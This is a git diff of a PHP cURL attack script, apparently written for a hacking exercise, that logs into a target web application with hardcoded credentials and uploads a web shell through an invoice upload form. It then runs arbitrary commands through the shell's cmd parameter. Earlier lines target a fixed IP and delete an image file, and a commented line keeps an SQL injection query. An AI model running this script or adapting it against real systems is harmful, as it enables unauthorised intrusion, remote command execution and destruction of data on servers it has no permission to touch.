@@ -3,9 +3,6 @@
  * Code Source: http://thisinterestsme.com/php-login-to-website-with-curl/
  */
 
-//[?] 1.pass webserver IP address
-//[?] 2.run cmd
-//[?] 3.integrate into yml
 //The username or email address of the account.
 define('USERNAME', 'vendor-1');
  
@@ -19,7 +16,7 @@ define('USER_AGENT', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, li
 define('COOKIE_FILE', 'cookie.txt');
  
 //Target IP
-define('IP_ADDRESS', 'http://35.166.196.232/');
+define('IP_ADDRESS', $argv[1]);
 
 //URL of the login form.
 define('LOGIN_FORM_URL', IP_ADDRESS.'login/main_login.php');
@@ -27,10 +24,10 @@ define('LOGIN_FORM_URL', IP_ADDRESS.'login/main_login.php');
 //Login action URL. Sometimes, this is the same URL as the login form.
 define('LOGIN_ACTION_URL', IP_ADDRESS.'login/checklogin.php');
  
-//Shell file
-define('SHELLPATH', '@shell.php'); 
 
-echo LOGIN_FORM_URL;
+//Upload file
+$shellPath = $argv[2];
+
 //An associative array that represents the required form fields.
 //You will need to change the keys / index names to match the name of the form
 //fields.
@@ -39,13 +36,9 @@ $loginValues = array(
     'mypassword' => PASSWORD
 );
 
-// $shellPath = "shell.php";
-// $shellFile = '@' . realpath($shellFile);
-
 $shellValues = array(
-    'invoice' => SHELLPATH
+    'invoice' => '@'.realpath($shellPath)
 );
-
 
 echo "Username: contractor\tPassword: password\n";
 
@@ -103,10 +96,16 @@ curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'upload.php');
 curl_setopt($curl, CURLOPT_POST, true);
  
 //Set our post fields / date (from the array above).
-curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($shellValues));
- 
+// curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($shellValues));
+curl_setopt($curl, CURLOPT_POSTFIELDS, $shellValues);
+
+//Tells cURL to return the output once the request has been executed.
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
+
 //Execute the POST request and print out the result.
-echo curl_exec($curl);
+curl_exec($curl);
+
+// [?] no check for wrong input
 
 //Check for errors!
 if(curl_errno($curl)){
@@ -116,24 +115,32 @@ if(curl_errno($curl)){
 	echo "Success of uploading shell file!\n";
 }
 
-//[?] bug to fix
+// //[?] bug to fix
 
-//We should be logged in by now. Let's attempt to access a password protected page
-// curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'index.php?query=anything%25%27+OR+%27x%27+LIKE+%27%25x');
-curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'images/shell.php\?cmd\=rm+default\.jpg');
-//Tell cURL that we want to carry out a POST request.
-curl_setopt($curl, CURLOPT_POST, false);
-  
-//Execute the POST request and print out the result.
-echo curl_exec($curl);
+// //We should be logged in by now. Let's attempt to access a password protected page
+// // curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'index.php?query=anything%25%27+OR+%27x%27+LIKE+%27%25x');
+// curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'images/shell.php\?cmd\=ls');
+// //Tell cURL that we want to carry out a POST request.
+// curl_setopt($curl, CURLOPT_POST, false);
 
-//Check for errors!
-if(curl_errno($curl)){
-	echo "Failure of running shell file...\n";
-    throw new Exception(curl_error($curl));
-} else{
-	echo "Success of running shell file!\n";
-}
+// //Execute the POST request and print out the result.
+// echo curl_exec($curl);
+
+// //Check for errors!
+// if(curl_errno($curl)){
+// 	echo "Failure of running shell file...\n";
+//     throw new Exception(curl_error($curl));
+// } else{
+// 	echo "Success of running shell file!\n";
+// }
+
+$cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
+$shellcmd = $argv[3];
+
+echo shell_exec ($cmd.$shellcmd);
+
+// $output = shell_exec('ls -lart');
+// echo "<pre>$output</pre>";
 
 //Close connection
 curl_close($curl);
